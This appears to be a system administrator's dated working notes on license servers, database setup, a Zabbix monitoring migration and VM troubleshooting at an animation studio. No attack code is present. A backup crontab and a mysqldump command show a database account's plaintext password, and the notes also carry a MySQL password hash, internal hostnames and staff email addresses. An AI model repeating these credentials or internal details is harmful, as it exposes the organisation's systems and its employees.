-rw-r--r--. 1 root root  32261 Oct 14  2016 license.gto.10.28.2016
-rw-r--r--. 1 root root  31638 Oct 14  2016 license.gto-14Oct16-siggy-ORIG

@@@ to check what pixologic licenses we have type:
/usr/pixologic/rlm/rlmutil rlmstat

@@@ pixologic files live here:
[root@dipper usr]# ll /usr/pixologic/rlm/
total 2360
-rw-r--r--. 1 root root      499 Oct  8  2015 license_ZBrush4_1_1seat.lic
-rw-r--r--. 1 root root      463 Feb 18  2016 license_ZBrush4_1_9seat.lic
lrwxrwxrwx. 1 root root       27 Feb 18  2016 pixologic.lic -> license_ZBrush4_1_9seat.lic
-rw-r--r--. 1  501 wheel      15 Dec  1  2014 pixologic.opt
-rw-rw-r--. 1  501 wheel     504 Dec  1  2014 pixologic.set
-rwxr-xr-x. 1  501 wheel 2022256 Oct 27  2014 rlm
-rw-r--r--. 1 root root   102256 Feb 20 00:01 rlm-pixologic.log
-rwxr-xr-x. 1 root root   267544 Oct  7  2015 rlmutil

@@@ clarrise = ilise

@@@ to check what ilise licenses we have type:
/opt/isotropix/ilise/licinfo dipper list

@@@ icense files live in 
ll /opt/isotropix/ilise/licenses/
total 20
-rw-r--r--. 1 root root 6956 Feb  1 09:58 2018-01-31_204708_W1801259718C9F_DisneyToon_Studios_floating_A0D3C104563C.license
drwxr-xr-x. 2 root root 4096 Apr 25  2017 NEW
drwxr-xr-x. 2 root root 4096 Feb  1 10:20 OLD
drwxr-xr-x. 2 root root 4096 Oct 14  2016 OLD_gracie

sesi = Houdini

@@@ to check what sesi licenses we have type:
/usr/lib/sesi/sesictrl -i

@@ the files live in
[root@dipper usr]# ll /usr/lib/sesi/
total 20344
drwxr-xr-x. 2 root root    4096 Mar 21  2017 BACKUP_SESI.20150910190501
drwxr-xr-x. 2 root root    4096 Mar 27  2017 BACKUP_SESI.2017031490631111091151
-rw-r--r--. 1 root root     256 Dec 12 12:08 license.auth
-rw-r--r--. 1 root root     141 Dec 12 12:08 license.dat
-rw-r--r--. 1 root root    7976 Dec 12 12:08 licenses
-rw-r--r--. 1 root root      80 Sep 15  2015 licenses.disabled
-rwxr-xr-x. 1 root root 7312872 Feb 18  2017 sesictrl
-rwxr-xr-x. 1 root root 7174352 Feb 18  2017 sesinetd
-r--r--r--. 1 root root      16 Mar 27  2017 sesinetd.options
-r-xr-xr-x. 1 root root    4270 Feb 18  2017 sesinetd_safe
-r-xr-xr-x. 1 root root    5152 Feb 18  2017 sesinetd.startup
-rwxr-xr-x. 1 root root 6288840 Feb 18  2017 sesiusage

^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
ssh deadline10

@@@ to check what Thinkbox (deadline) licenses we have type:
cat /opt/Thinkbox/License\ Server/Thinkbox.lic
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
@@@ copy for Colleen in ~/JOBS/DISNEYTS/LICENSING/dipper-stuff
******************************************************************************************************
22Feb18  postgres db (vmpostgres[1-2])

see NOTES.txt "17Jan18"

[root@vmpostgres1 ~]# psql --username=postgres
psql (9.4.6, server 9.4.4)
Type "help" for help.


postgres=# \l
                                  List of databases
   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-----------+----------+----------+-------------+-------------+-----------------------
 dpix_dev  | dpixuser | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
(4 rows)

@@@ run in forground with higher debug value
/usr/pgsql-9.4/bin/postgres -d 3 -D /DB/pgsql/9.4/p5442/data/

@@@ to exit postgres
postgres=# \q


@@@ see NOTES-POSTGRES and http://confluence.disneytoonstudios.com/pages/editpage.action?pageId=6458308

EMAIL: stuart.mcdougal@disneyanimation.com and/or zachary.stokes@disney.com
@@@ see email dated 26Feb18


******************************************************************************************************
26Feb18  new autodesk licensing scheme  (NLRS)

@@@ has to be run on another machine than what is running existing licensing (dipper)

SO on dippertwo I installed the RPM.
yum install ~dsiegfriedt/JOBS/DISNEYTS/AUTODESK/nlm11.13.1.2_ipv4_ipv6_linux64.rpm

[root@dippertwo ~]# ll /opt/flexnetserver/
total 7772
-r-xr-xr-x. 1 root root 1656680 May 22  2016 adskflex
-r--r--r--. 1 root root 3381785 May 22  2016 LicenseAdministration.pdf
-r-xr-xr-x. 1 root root 1551536 May 22  2016 lmgrd
-r-xr-xr-x. 1 root root 1362736 May 22  2016 lmutil

@@@ added /lib/systemd/system/flexnetserver.service

@@@ https://forums.autodesk.com/t5/installation-licensing/network-license-server-on-linux/td-p/7232684

@@@ in addition to the service file you need to (included in the service file)
#It is advised to run flexnet as a non root user so use the following commands to create the flexlm user:
# 
#useradd flexlm
#usermod -d /opt flexlm
#usermod -c "Privileged FlexLM User" flexlm
#usermod -u 123 flexlm
#groupmod -g 123 flexlm
#usermod -s /sbin/nologin flexlm
#find $WorkingDirectory -exec chown flexlm {} \;
#find $WorkingDirectory -exec chgrp flexlm {} \;

[root@dippertwo system]# cat /etc/passwd | grep flex
flexlm:x:123:123:[root@dippertwo system]# cat /etc/group | grep flex
flexlm:x:123:
Privileged FlexLM User:/opt:/sbin/nologin

@@@ and now we wait.   we don't have the new ".lic" file yet

******************************************************************************************************
27Feb18  wordpress install

@@@ before wordpress can be installed you need to have a LAMP stack up and working.
https://www.digitalocean.com/community/tutorials/how-to-install-linux-apache-mysql-php-lamp-stack-on-centos-7

@@@  install steps for wordpress
https://www.digitalocean.com/community/tutorials/how-to-install-wordpress-on-centos-7


@@@ mariadb secure script

set passwd to S3....


*********[root@wordpress ~]# mysql_secure_installation

NOTE: RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MariaDB
      SERVERS IN PRODUCTION USE!  PLEASE READ EACH STEP CAREFULLY!

In order to log into MariaDB to secure it, we'll need the current
password for the root user.  If you've just installed MariaDB, and
you haven't set the root password yet, the password will be blank,
so you should just press enter here.

Enter current password for root (enter for none): 
OK, successfully used password, moving on...

Setting the root password ensures that nobody can log into the MariaDB
root user without the proper authorisation.

Set root password? [Y/n] y          
New password: 
Re-enter new password: 
Password updated successfully!
Reloading privilege tables..
 ... Success!


By default, a MariaDB installation has an anonymous user, allowing anyone
to log into MariaDB without having to have a user account created for
them.  This is intended only for testing, and to make the installation
go a bit smoother.  You should remove them before moving into a
production environment.

Remove anonymous users? [Y/n] y
 ... Success!

Normally, root should only be allowed to connect from 'localhost'.  This
ensures that someone cannot guess at the root password from the network.

Disallow root login remotely? [Y/n] n
 ... skipping.

By default, MariaDB comes with a database named 'test' that anyone can
access.  This is also intended only for testing, and should be removed
before moving into a production environment.

Remove test database and access to it? [Y/n] n
 ... skipping.

Reloading the privilege tables will ensure that all changes made so far
will take effect immediately.

Reload privilege tables now? [Y/n] y
 ... Success!

Cleaning up...

All done!  If you've completed all of the above steps, your MariaDB
installation should now be secure.

Thanks for using MariaDB!
*********************************************************************************************
26Feb18  zabbix upgrade

dsiegfriedt@dts3329:~ $ ssh zabbix
Last login: Fri Feb 23 16:28:59 2018 from dts3329.disneytoonstudios.com
dsiegfriedt@mayday:~ $ zabbix_agentd -V
Zabbix Agent (daemon) v2.4.6 (revision 54796) (10 August 2015)
Compilation time: Aug 10 2015 17:23:53
dsiegfriedt@mayday:~ $ 

@@@ latest is 3.4
@@@ deleted zabbixtwo, it was running 7.1   wanted to start fresh

https://www.zabbix.com/forum/showthread.php?t=58239

Data can be transferred to a different server by transferring the database :-

[Perform below steps on the Server to be transferred]

1.Stop the Zabbix server
systemctl stop zabbix-server
2.Backup of database
mysqldump -uroot -p<password> --database <Db_name> > <backup_name>.sql 

[Perform below steps on the Server where database to be transferred (Destination Server)]

Pre-requisite: Zabbix set up is already complete
　1.Stop Zabbix Server
	 systemctl stop zabbix-server
　2.Delete Zabbix database
	   DROP DATABASE zabbix
　3.Create Zabbix database
	   CREATE DATABASE zabbix
　4.Restore the obtained backup
	    mysql -u username -p database_name < backup_name.sql
　5.Start Zabbix Server 
	  systemctl start zabbix-server


[Host to be monitored]
　1.Stop Zabbix agent
	 systemctl stop zabbix-agentd
　2. Change IP address of Zabbix Server in the configuration file of ZabbixAgent
　　 	    File：/etc/zabbix/zabbix_agentd.conf
　　	    Changed location：Server=<NEW_SERVER_IP>
　　　　　　　ServerActive=<NEW_SERVER_IP>
　3.Start Zabbix Agent
	  systemctl start zabbix-agentd


@@@ spoke with Grace on nameing..... doesn't want to tie app to machine.

@@@ naming it for general function

@@@ monitor.disneytoonstudios.com

zabbix is based on Mariadb.  See NOTES-MYSQL (dated 27Feb18) for database information.

[root@mayday ~]# du -sh /DB/mariadb/10.0/p3306/
38G	/DB/mariadb/10.0/p3306/

@@@ fresh install 
https://www.zabbix.com/download

@@@ create new DB fails as if mysql is not installed/running

@@@ see NOTSES-MYSQL (6Mar18) for install of mariadb (mysql)... steps not listed in zabbix documentation.

[root@monitor ~]# systemctl enable zabbix-server
Created symlink from /etc/systemd/system/multi-user.target.wants/zabbix-server.service to /usr/lib/systemd/system/zabbix-server.service.

systemctl start zabbix-server
systemctl start zabbix-proxy.service

******************************************************************************************************
28Feb18
@@@ to find version of new flexlm on dippertwo

dsiegfriedt@dippertwo:~ $ /opt/flexnetserver/lmgrd -V
lmgrd v11.13.1.2 build 173085 x64_lsb - Copyright (c) 1988-2015 Flexera Software LLC. All Rights Reserved.

******************************************************************************************************
28Feb18  zabbix not running on vmpingfederate

@@@ /etc/passdw has this
colord:x:990:987:User for colord:/var/lib/colord:/sbin/nologin
@@@ this is the same UID/GID that the zabbix user "SHOULD" have

[root@vmpingfederate etc]# rpm -qa | grep color
colord-1.2.7-2.el7.x86_64
colord-libs-1.2.7-2.el7.x86_64
hicolor-icon-theme-0.12-7.el7.noarch
color-filesystem-1-13.el7.noarch

[root@vmpingfederate etc]# yum remove colord

[root@vmpingfederate etc]# rpm -qa | grep colord
colord-libs-1.2.7-2.el7.x86_64

@@@ too many (42) packages would be reoved if I removed colord-libs so I left it
@@@ the colord user is still there

[root@vmpingfederate etc]# userdel colord

yum install colord
@@@ re-adds the colord user into /etc/passwd

[root@vmpingfederate etc]# userdel colord
@@@ witout yum remove colord

[root@vmpingfederate etc]# systemctl start zabbix-agent
[root@vmpingfederate etc]# systemctl status zabbix-agent

OK!!!


NOW on to vmmunki

@@@ passwd has:
systemd-network:x:990:987:systemd Network Management:/:/sbin/nologin

[root@vmmunki ~]# cat /etc/passwd | grep 990
dockerroot:x:993:990:Docker User:/var/lib/docker:/sbin/nologin
                 ^^^
systemd-network:x:990:987:systemd Network Management:/:/sbin/nologin
                  ^^^

[root@vmmunki ~]# cat /etc/passwd | grep 986
geoclue:x:989:986:User for geoclue:/var/lib/geoclue:/sbin/nologin
              ^^^


@@@ for reference......
[root@monitor ~]# id zabbix
uid=990(zabbix) gid=986(zabbix) groups=986(zabbix),1100(prodctn)

userdel systemd-network
cat /etc/passwd | grep network
  994  systemctl status zabbix-agent
  995  systemctl start zabbix-agent

@@@ different VMs I had to 
@@@ [root@vmmailhub ~]# mkdir /run/zabbix
@@@ [root@vmmailhub ~]# chown zabbix.zabbix /run/zabbix/
@@@ then it started fine.....

  996  yum install zabbix-agent
  997  systemctl status zabbix-agent
  998  systemctl start zabbix-agent
  999  systemctl status zabbix-agent

OK!!!

******************************************************************************************************
1Mar18   prep for faceroll group VMs

vmroll1
vmfaceroll
vmrollel7
vmmariadb1
vmmariadb2
vmgitlabhooks
vmjenkins
dtsweb

@@@jenkins test (according to Amy)
http://vmjenkins.disneytoonstudios.com/
	puppet_pull
	  Build Now

@@@ roll test  (according to Amy)
    http://vmfaceroll.disneytoonstudios.com
      Builds (Top Right)
        All Builds (Top Left)
	    @@@if it shows anything you are OK

@@@ vmgitlabhooks test (according to Richard 5Mar18)
    http://vmgitlabhooks.disneytoonstudios.com/  # should show you something

******************************************************************************************************
6Mar18 continuation of zabbix install on monitor

https://www.zabbix.com/download?zabbix=3.4&os_distribution=centos&os_version=7&db=MySQL

[root@monitor yum.repos.d]# mysql -uroot -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 35
Server version: 10.1.31-MariaDB MariaDB Server

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> create database zabbix character set utf8 collate utf8_bin;
Query OK, 1 row affected (0.01 sec)

MariaDB [(none)]> 

MariaDB [(none)]> create database zabbix character set utf8 collate utf8_bin;
Query OK, 1 row affected (0.01 sec)

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| test               |
| zabbix             |
+--------------------+
5 rows in set (0.00 sec)

MariaDB [(none)]> grant all privileges on zabbix.* to zabbix@localhost identified by 'Ti...';
Query OK, 0 rows affected (0.00 sec)

MariaDB [(none)]> quit
Bye

@@@ to be done once the db is exported from zabbix and imorted into monitor

systemctl start zabbix-server zabbix-agent httpd
systemctl enable zabbix-server zabbix-agent httpd

vim /etc/httpd/conf.d/zabbix.conf

Configure Zabbix frontend

Connect to your newly installed Zabbix frontend: http://server_ip_or_name/zabbix 
Follow steps described in Zabbix documentaion: Installing frontend

@@@ migrating the DB
https://gist.github.com/mwalczak/9807459

@@@ server configuration file
/etc/zabbix/zabbix_server.conf 

@@@ 676 lines and 11 not commented out.
[root@monitor yum.repos.d]# cat /etc/zabbix/zabbix_server.conf | grep -v "#" | sed /^$/d
LogFile=/var/log/zabbix/zabbix_server.log
LogFileSize=0
PidFile=/var/run/zabbix/zabbix_server.pid
SocketDir=/var/run/zabbix
DBName=zabbix
DBUser=zabbix
SNMPTrapperFile=/var/log/snmptrap/snmptrap.log
Timeout=4
AlertScriptsPath=/usr/lib/zabbix/alertscripts
ExternalScripts=/usr/lib/zabbix/externalscripts
LogSlowQueries=3000

@@@ has plain text passwd
# DBPassword=<passwd in plain text>

@@@ below is copied from NOTES-MYSQL dated 21Aug17  this is before teh new zabbix VM had it's name changed to monitor
https://stackoverflow.com/questions/17666249/how-to-import-an-sql-file-using-the-command-line-in-mysql

@@@ stop zabbix (agent and server)  ORDER COUNTS
systemctl status zabbix-agent
systemctl stop zabbix-agent
systemctl status zabbix-agent

systemctl status zabbix-server
systemctl stop zabbix-server
systemctl status zabbix-server

@@@ stop zabbix db to get a quiet copy
[root@mayday ~]# systemctl status mysql
[root@mayday ~]# systemctl stop mysql
[root@mayday ~]# systemctl status mysql

NOTE@@@ login to DB on mayday
mysql -uroot

@@@ make a dump of the DB on zabbix
/usr/bin/mysqldump zabbix > /tmp/zabbix-backup-6Mar18.sql

cp /tmp/zabbix-backup-6Mar18.sql /disney/home/dsiegfriedt/JOBS/DISNEYTS/ZABBIX/zabbix.sql 

@@@ start zabbix db		 ORDER COUNTS
[root@mayday ~]# systemctl start mysql
[root@mayday ~]# systemctl status mysql

@@@ start zabbix (server and agent)
systemctl start zabbix-server
systemctl status zabbix-server

systemctl start zabbix-agent
systemctl status zabbix-agent

@@@ wait... I can use the nightly backup

[root@mayday ~]# crontab -l
0 1 * * * /usr/bin/mysqldump -ubackupadmin -pbackAdmin! zabbix > /DB/mariadb/10.0/p3306/backups/zabbix.sql

MariaDB [(none)]> SELECT User FROM mysql.user;
+-------------+
| User        |
+-------------+
| backupadmin |
| zabbix      |
| root        |
| root        |
|             |
| root        |
| zabbix      |
|             |
| root        |
+-------------+
9 rows in set (0.00 sec)

MariaDB [(none)]> SELECT User, Db, Host from mysql.db;
+--------+---------+-----------+
| User   | Db      | Host      |
+--------+---------+-----------+
|        | test    | %         |
|        | test\_% | %         |
| zabbix | zabbix  | localhost |
+--------+---------+-----------+
3 rows in set (0.01 sec)

MariaDB [(none)]> show grants;
+---------------------------------------------------------------------+
| Grants for root@localhost                                           |
+---------------------------------------------------------------------+
| GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost' WITH GRANT OPTION |
| GRANT PROXY ON ''@'%' TO 'root'@'localhost' WITH GRANT OPTION       |
+---------------------------------------------------------------------+
2 rows in set (0.00 sec)

@@@ DOH
MariaDB [(none)]> show grants for 'backupadmin'@localhost;
ERROR 1141 (42000): There is no such grant defined for user 'backupadmin' on host 'localhost'

MariaDB [(none)]> show grants for 'zabbix'@localhost;
+---------------------------------------------------------------------------------------------------------------+
| Grants for zabbix@localhost                                                                                   |
+---------------------------------------------------------------------------------------------------------------+
| GRANT USAGE ON *.* TO 'zabbix'@'localhost' IDENTIFIED BY PASSWORD '*DEEF4D7D88CD046ECA02A80393B7780A63E7E789' |
| GRANT ALL PRIVILEGES ON `zabbix`.* TO 'zabbix'@'localhost'                                                    |
+---------------------------------------------------------------------------------------------------------------+
2 rows in set (0.00 sec)

MariaDB [(none)]> grant all privileges on *.* to 'backupadmin'@'localhost';
Query OK, 0 rows affected (0.02 sec)

MariaDB [(none)]> show grants for 'backupadmin'@localhost;
+----------------------------------------------------------+
| Grants for backupadmin@localhost                         |
+----------------------------------------------------------+
| GRANT ALL PRIVILEGES ON *.* TO 'backupadmin'@'localhost' |
+----------------------------------------------------------+
1 row in set (0.00 sec)

@@@ set backupadmin password to what is in the cron command

@@@ [root@mayday ~]# crontab -l
@@@ 0 1 * * * /usr/bin/mysqldump -ubackupadmin -p<encrypted-file> zabbix > /DB/mariadb/10.0/p3306/backups/zabbix.sql

MariaDB [(none)]> set password for 'backupadmin'@'localhost' = PASSWORD('<passwd>');
Query OK, 0 rows affected (0.00 sec)

@@@ was able to login to mysql (on mayday) with these creds

======================================================================================================================
======================================================================================================================
======================================================================================================================

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
		THIS stuff is WRONG
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


@@@ on monitor (the new zabbix server)

@@@ import existing DB
[root@zabbixtwo ~]# mysql -uroot -p < /disney/home/dsiegfriedt/JOBS/DISNEYTS/ZABBIX/zabbix.sql 
Enter password: 

@@@ continue with zabbix install
https://www.zabbix.com/documentation/3.4/manual/installation/install_from_packages/rhel_centos/
https://www.zabbix.com/documentation/3.2/manual/installation/install_from_packages/server_installation_with_mysql
vim  /etc/httpd/conf.d/zabbix.conf
php_value date.timezone america/los_angeles

@@@ and den
https://www.zabbix.com/documentation/3.2/manual/installation/install#installing_frontend

@@@ and den
https://www.zabbix.com/documentation/3.4/manual/quickstart/login


1. Export the database (MySQL) from 2.4.8.		@@@ used backup script.....
2. Install 3.4 on new server.  	    	     		@@@ DONE 
3. Modify config files in accordance with old server.	@@@ DONE by hand
4. Import the 2.4.8 database into MySQL.      		@@@ DONE by hand
5. Start zabbix server 3.4 and have it upgrade the database as if it was an in place upgrade

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
		/THIS stuff is WRONG
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


******************************************************************************************************
6MAr18 puppet error for shotgunapi

[root@chug www]# cd /etc/httpd/
[root@chug httpd]# ll
total 16
drwxr-xr-x. 2 root root   52 May 19  2017 conf
drwxr-xr-x. 4 root root 4096 May 31  2017 conf.d
drwxr-xr-x. 2 root root 4096 May 19  2017 conf.modules.d
lrwxrwxrwx  1 root root   19 Jul 18  2016 logs -> ../../var/log/httpd
lrwxrwxrwx  1 root root   29 Jul 18  2016 modules -> ../../usr/lib64/httpd/modules
lrwxrwxrwx  1 root root   10 Jul 18  2016 run -> /run/httpd
[root@chug httpd]# grep -iR document *
conf/magic:# Office/OLE documents for which msword is not correct. See PR#2608.
conf/magic:# from Apple quicktime file format documentation.
conf.d/03-crane.conf:  DocumentRoot "/usr/share/crane/"
conf.d/05-foreman.conf:  DocumentRoot "/usr/share/foreman/public"
conf.d/05-foreman-ssl.conf:  DocumentRoot "/usr/share/foreman/public"
conf.d/15-default.conf:  DocumentRoot "/var/www/html"

[root@chug html]# cat /etc/fstab
#
# /etc/fstab
# Created by anaconda on Wed Jul 22 17:41:08 2015
#
# Accessible filesystems, by reference, are maintained under '/dev/disk'
# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info
#
/dev/mapper/myvg-root   /                       xfs     defaults        0 0
UUID=17563f0f-4a06-42cd-ba43-9630ad2411fb /boot                   xfs     noatime,discard 0 0
/dev/mapper/myvg-scratch /disk1                xfs     defaults        0 0
/dev/mapper/myvg-swap   swap                    swap    defaults        0 0

# PULP repo mount 
theorem.disneytoonstudios.com:/ifs/data/disney/dist/linux/repo/pulp/chug /var/lib/pulp  nfs rw,bg,intr,rsize=524288,wsize=524288,soft  0 0

[root@chug html]# cd /var/lib/pulp

[root@chug pulp]# ll
total 1703
drwxr-xr-x   9 apache  apache    179 Oct  4  2016 content
drwxr-xr-x 378 apache  apache  54826 Mar  5 17:00 importers
-rw-r--r--   1 apache  apache      0 Oct  4  2016 init.flag
drwxr-xr-x   2 foreman foreman     0 Oct  4  2016 katello-export
drwxr-xr-x   3 apache  apache     27 May 10  2016 nodes
drwxr-xr-x   2 apache  apache      0 Apr 23  2015 packages
drwxr-xr-x   7 apache  apache    114 Apr 10  2017 published
-rw-r--r--   1 apache  apache      4 May  1  2017 sn.dat
-rw-r--r--   1 root    apache      4 Apr 25  2017 sn.dat.bkp
drwxr-xr-x   2 apache  apache     29 May 19  2017 static
drwxr-xr-x   2 apache  apache      0 Apr 10  2017 uploads
drwxr-xr-x   3 apache  apache     23 Apr 23  2015 working

[root@chug pulp]# find . -name "*shotgunapi*"
./content/units/rpm/c0/659a60a037867553d2d5048c5fc09580d4cb186f7f8e39b8fc86d5d2ff3e1f/shotgunapi-1.1.0.22.g360c3e0-1.el7.x86_64.rpm
./content/units/rpm/0d/57b592852f46f0a999c438e3435b80701b0d6c8c0186815326de14357b1f13/shotgunapi-debuginfo-1.1.0.9.g56371b1-1.el7.x86_64.rpm
./content/units/rpm/61/b70997027aba4deadffc65f26fe7e32e83433d359dea56757b5b1b8e734de6/shotgunapi-1.1.0.82.g61a7910-1.el7.x86_64.rpm
./content/units/rpm/46/81a44af31252fd935cef9d687f528850062cbd8537d1c252d01fc5b619290d/shotgunapi-debuginfo-1.1.0.11.g2c76e4e-1.el7.x86_64.rpm
...

@@@ googled for presto error.... (BTW presto plugin is not installed)

http://xmodulo.com/how-to-fix-yum-errors-on-centos-rhel-or-fedora.html

rm -f /var/lib/rpm/__db.*
db_verify /var/lib/rpm/Packages
rpm --rebuilddb
yum clean all
yum list

******************************************************************************************************
6Mar18  ol-jammer put into maintenance mode.   NOT powered off or shutdown

@@@ now only 4 machines on leadbottom

******************************************************************************************************
7Mar18 vmnotify had a local user "dockerroot" that had teh UID for zabbix... so zabbix would not start.

userdel dockerroot

******************************************************************************************************
7Mar18 
@@@zabbix mysqldump had a 0 length file so I ran it by hand (without the -hmayday flag)

[root@mayday ~]# /usr/bin/mysqldump -ubackupadmin -pbackAdmin! zabbix > /tmp/zabbix.sql

@@@ seems to reset zabbix L-O-T-S of emails

cp /tmp/zabbix.sql /DB/mariadb/10.0/p3306/backups/zabbix.sql-siggy-7Mar18

******************************************************************************************************
8Mar18  something that is close to chkconfig --list for systemd

systemctl list-units | grep running 

******************************************************************************************************
7Mar18   last 2 VMs on RHEV

vmmailhub
^^^^^^^^^
systemctl list-units | grep running | wc -l
40

ps -ef > ~dsiegfriedt/vmmailhub-ps

[root@vmmailhub ~]# runlevel
N 3

[root@vmmailhub ~]# crontab -l
no crontab for root
[root@vmmailhub ~]# ll /var/spool/cron/
total 4
-rw-------. 1 root root 405 Jan 27  2016 zabbix
[root@vmmailhub ~]# cat /var/spool/cron/zabbix 
# HEADER: This file was autogenerated at Sun Jun 21 09:37:09 -0700 2015 by puppet.
# HEADER: While it can still be managed manually, it is definitely not recommended.
# HEADER: Note particularly that the comments starting with 'Puppet Name' should
# HEADER: not be deleted, as doing so could cause duplicate cron jobs.
# Puppet Name: zabbix_top_log
* * * * * /usr/local/bin/zabbix_top.py > /dev/null 2>&1

@@@ ran command by hand
[root@vmmailhub ~]# /usr/local/bin/zabbix_top.py

@@@ output to /share/logs/adm/zabbix/top/
 
[root@vmmailhub ~]# ll /share
lrwxrwxrwx. 1 root root 13 Sep  4  2015 /share -> /disney/share

[root@vmmailhub ~]# ll -rt /share/logs/adm/zabbix/top/
total 1107089
-rw-r--r--. 1 zabbix zabbix 213204558 Jan  5 09:59 vmsyslog.disneytoonstudios.com_top.log
-rw-r--r--. 1 zabbix zabbix 132951010 Feb 23 14:18 vmdpix.disneytoonstudios.com_top.log
-rw-r--r--. 1 zabbix zabbix 123400893 Mar  7 10:44 vmcron.disneytoonstudios.com_top.log
-rw-r--r--. 1 zabbix zabbix 239223077 Mar  7 10:44 vmjenkins.disneytoonstudios.com_top.log
-rw-r--r--. 1 zabbix zabbix  89457169 Mar  7 10:44 vmdepotapp.disneytoonstudios.com_top.log
-rw-r--r--. 1 zabbix zabbix 141034038 Mar  7 10:44 vmmailhub.disneytoonstudios.com_top.log

dsiegfriedt@vmmailhub:~ $ sudo systemctl list-units | grep running | wc -l
[sudo] password for dsiegfriedt: 
40

systemctl list-units | grep running  > ~dsiegfriedt/vmmailhub-list


vmcorpdir
^^^^^^^^^
[root@vmcorpdir ~]# systemctl list-units | grep running | wc -l
44

[root@vmcorpdir ~]# ps -fe > ~dsiegfriedt/vmcorpdir-ps

[root@vmcorpdir ~]# runlevel
N 5

[root@vmcorpdir ~]# crontab -l
# run corporate directory sync every 20 minutes
0,20,40 * * * * /disney/depts/tech/systems/corpsync/corpsync.py

@@@ cat /disney/depts/tech/systems/corpsync/corpsync.py
#!/usr/bin/python
#
# corpsysnc.py
#
# Import ldap entries from internal directory into a new directory with out private information 
# to be used by Disney Corporate Information services and SMD mail routing
{SNIP}

ssh vmcorpdir systemctl list-units | grep running  > ~dsiegfriedt/vmcorpdir-list

******************************************************************************************************
7Mar18
esxi console shell (getting to it)

login

Alt-F1

******************************************************************************************************
7Mar18  re-start new zabbix install

@@@ after removing all zabbix and mariadb stuff
https://www.zabbix.com/documentation/3.4/manual/installation/install_from_packages/rhel_centos
Server/proxy/frontend installation

@@@ failed on install of zabbix-proxy-mysql
file /usr/lib/zabbix/externalscripts from install of zabbix-proxy-2.4.5-1.el7.x86_64 conflicts with file from package zabbix-server-2.4.5-1.el7.x86_64


@@@ NOTE: In order to install zabbix-web-mysql on RHEL 7 you need to enable rhel-7-server-optional-rpms repository.
yum repolist enabled
{SNIP}
rhel-7-server-optional-rpms     rhel-7-server-optional-rpms      21,400
{SNIP}

@@@ file system contents do not match documentation
@@@ command = zcat /usr/share/doc/zabbix-server-mysql*/create.sql.gz | mysql -uzabbix -p zabbix

[root@monitor ~]# ll /usr/share/doc/zabbix-server-mysql-2.4.5/create/
total 2988
-rw-r--r--. 1 root root  972942 Apr 22  2015 data.sql
-rw-r--r--. 1 root root 1978341 Apr 22  2015 images.sql
-rw-r--r--. 1 root root  104816 Apr 22  2015 schema.sql

@@@ create DB
https://www.zabbix.com/documentation/3.4/manual/appendix/install/db_scripts#mysql
of NO help
"A Zabbix database must be created during the installation of Zabbix server or proxy."
NOPE

start again

yum erase zabbix*
[root@monitor doc]# rpm -qa | grep zabbix
zabbix-web-mysql-2.4.5-1.el7.noarch
zabbix-agent-2.4.5-1.el7.x86_64
zabbix-server-mysql-2.4.5-1.el7.x86_64
zabbix-2.4.5-1.el7.x86_64
